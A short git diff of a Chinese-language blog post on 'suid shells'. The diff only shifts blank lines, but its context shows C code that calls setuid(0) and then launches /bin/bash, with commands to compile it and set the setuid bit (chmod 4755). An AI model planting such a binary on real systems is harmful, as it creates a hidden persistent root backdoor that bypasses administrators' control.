@@ -10,6 +10,10 @@ author: PythonPig
 {:toc}
 ![](https://github.com/PythonPig/PythonPig.github.io/blob/master/images/suid%20shell/suid%20hack.jpeg?raw=true)  
 suid shell 是可以以shell所有者权限运行的shell。 
+
+
+
+
 ### \#0x00 suid shell生成
 
 suid shell简单代码：  
@@ -20,10 +24,6 @@ setuid(0);
 system("/bin/bash");
 }
 ```
-
-
-
-
 切换至root下，执行：  
 gcc bashwrap.c -o bashwrap  
 chmod 4755 bashwrap  （赋予suid权限）  
